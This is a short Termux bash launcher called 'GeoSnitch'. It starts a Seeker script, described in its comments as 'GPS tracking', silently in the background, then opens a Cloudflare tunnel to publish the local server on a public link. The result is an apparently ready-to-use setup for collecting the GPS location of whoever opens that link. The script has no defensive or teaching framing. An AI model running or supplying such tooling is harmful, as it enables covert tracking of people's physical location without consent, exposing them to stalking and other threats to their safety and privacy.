#!/data/data/com.termux/files/usr/bin/bash

# Colors
green="\e[32m"
red="\e[31m"
end="\e[0m"

echo -e "${green}[+] Launching GeoSnitch...${end}"
cd ~/seeker || {
    echo -e "${red}[-] Seeker folder not found!${end}"
    exit 1
}

# Start Seeker in background
echo -e "${green}[+] Starting Seeker (GPS tracking)...${end}"
nohup python3 seeker.py > /dev/null 2>&1 &

sleep 5

# Start Cloudflare tunnel
echo -e "${green}[+] Starting Cloudflare Tunnel (secure link)...${end}"
cloudflared tunnel -url http://localhost:8080
